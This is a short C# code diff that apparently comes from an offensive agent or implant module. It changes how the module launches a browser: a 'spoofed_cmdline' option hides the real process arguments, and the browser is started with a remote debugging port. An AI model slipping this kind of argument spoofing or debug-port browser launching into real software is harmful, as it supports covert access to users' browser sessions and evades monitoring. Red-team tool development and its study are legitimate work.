@@ -267,14 +267,29 @@ namespace Agent
                     return false;
             }
 
-            commandline = finder.FindPath();
-
             string spoofedcmdline = string.Empty;
 
-            if (!string.IsNullOrEmpty(this.config.cmdline))
+            if (!string.IsNullOrEmpty(this.config.spoofed_cmdline))
             {
                 spoofedcmdline = $"{finder.FindPath()} {this.config.cmdline}";
             }
+
+            if (!string.IsNullOrEmpty(this.config.cmdline))
+            {
+                commandline = this.config.cmdline;
+            }
+            else
+            {
+                string location = finder.FindPath();
+
+                if (string.IsNullOrEmpty(location))
+                {
+                    await ReturnOutput("[!] Failed to find executable locatino.", task_id);
+                    return false;
+                }
+                commandline = $"{location} --remote-debugging-port={this.config.debug_port}";
+            }
+
 
             SpawnOptions opts = new SpawnOptions()
             {
